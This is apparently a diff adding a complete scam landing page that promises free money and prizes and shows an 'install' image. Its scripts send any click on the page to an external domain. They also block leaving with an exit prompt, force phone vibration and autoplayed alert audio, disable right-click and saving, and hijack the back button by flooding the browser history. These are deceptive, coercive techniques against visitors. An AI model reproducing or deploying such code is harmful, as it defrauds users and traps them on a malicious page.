@@ -1,0 +1,166 @@
+<html><head>
+  <base href="">
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<title>*** Win Money.Play Now ***</title>
+<meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="format-detection" content="telephone=no">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<style type="text/css">.cf-hidden { display: none; } .cf-invisible { visibility: hidden; }</style></head><body onclick="goto();">
+
+
+<script>
+function getURLParameter(name) {
+    return decodeURI(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
+    );
+}
+</script> 
+
+<script>
+function goto(){
+  PreventExitPop=!1;
+  location.href = "http://zerokage.xyz/?flux_action=1";
+}
+</script>   
+	
+<meta name="GENERATOR" content="MSHTML 9.00.8112.16553">
+<link rel="stylesheet" type="text/css" href="index.css" media="all">
+ <script type="text/javascript">
+  var PreventExitPop = true;
+  function ExitPop() {
+    if(PreventExitPop != false) {
+      return "Are you sure you do not want free money?"
+    }
+  }
+  window.onbeforeunload = ExitPop;
+  </script>
+
+
+<div class="main">
+
+<h3 class="blink-title blink" style="margin: 12px auto; font-size: 20px; display: block;"><font color="red">WIN PRIZES WHILE YOU WATCH TV!! </font></h3>
+<h4>Simply Scratch for fun everyday and win gift cards and vacations.</h4> 
+<h4>One lucky winner will win a 1,000,000 dollars this year</h4>
+<marquee>
+    <img src="images/winners.png" class="floatingleft" />
+    <img src="images/winners2.png" class="floatingleft" />
+</marquee>
+
+<img src="images/install.png" style="text-align:center;width:95%"/>
+
+ 
+
+
+<!-- Vibration Script -->
+  <script type="text/javascript">
+    navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+    window.onload = function(){ navigator.vibrate([1500, 100, 1500, 100]); }
+  </script>
+
+<!-- Audio play script -->
+  <audio class="foo" autoplay="autoplay" preload="">
+  <source src="alert.ogg" type="audio/ogg">
+  <source src="alert.mp3" type="audio/mpeg">
+  </audio>
+  <script>
+    var audioElements = document.getElementsByTagName('audio'),
+    sounds = {};
+    
+    for (var i = 0; i < audioElements.length; i++) {
+    sounds[audioElements[i].className] = audioElements[i];
+    }
+    
+    // Solves chrome for andriod issue 178297 Require user gesture
+    // https://code.google.com/p/chromium/issues/detail?id=178297
+    // Fix based on code from http://blog.foolip.org/2014/02/10/media-playback-restrictions-in-blink/
+    if (mediaPlaybackRequiresUserGesture()) {
+    window.addEventListener('keydown', removeBehaviorsRestrictions);
+    window.addEventListener('mousedown', removeBehaviorsRestrictions);
+    window.addEventListener('touchstart', removeBehaviorsRestrictions);
+    }
+    
+    function mediaPlaybackRequiresUserGesture() {
+    // test if play() is ignored when not called from an input event handler
+    var video = document.createElement('video');
+    video.play();
+    return video.paused;
+    }
+    
+    function removeBehaviorsRestrictions() {
+    for (var i = 0; i < audioElements.length; i++) {
+    audioElements[i].load();
+    }
+    
+    window.removeEventListener('keydown', removeBehaviorsRestrictions);
+    window.removeEventListener('mousedown', removeBehaviorsRestrictions);
+    window.removeEventListener('touchstart', removeBehaviorsRestrictions);
+    }
+    
+    function playSound(sound) {
+    for (var key in sounds) {
+    sounds[key].pause();
+    }
+    
+    sounds[sound].load();
+    sounds[sound].play();
+    }
+    
+    
+    playSound('foo');
+    </script>
+<!-- Disable Right Click Script -->
+    <script language="JavaScript">
+    var message="";
+    ///////////////////////////////////
+    function clickIE() {
+    if (document.all) {
+    (message);
+    return false;
+    }
+    }
+    function clickNS(e) {
+    if (document.layers||(document.getElementById&&!document.all)) {
+    if (e.which==2||e.which==3) {
+    (message);
+    return false;
+    }
+    }
+    } // # end function
+    if (document.layers || navigator.userAgent.indexOf("Opera") >=0){
+    document.captureEvents(Event.MOUSEDOWN);
+    document.onmousedown=clickNS;
+    }
+    else{
+    document.onmouseup=clickNS;
+    document.oncontextmenu=clickIE;
+    }
+
+    document.oncontextmenu=new Function("return false")
+    </script>
+
+    <script>
+    $(document).bind('keydown keypress', 'ctrl+s', function(){
+    $('#save').click(); 
+    return false;
+    });
+    </script>
+
+<!-- Back Button Redirect -->
+  <script type=text/javascript>
+  var url = window.location.href;
+
+  if (url.search("back=true") >= 0) {
+      alert("Backbutton");
+  } else { 
+      alert("Not Back Button");
+  }
+
+  !function(){var a;try{for(a=0;10>a;++a){history.pushState({},"","#")}onpopstate=function(c){c.state&&location.replace(window.location.pathname + window.location.search + "&back=true")}}catch(b){}}();
+  </script>
+
+
+</body></html>
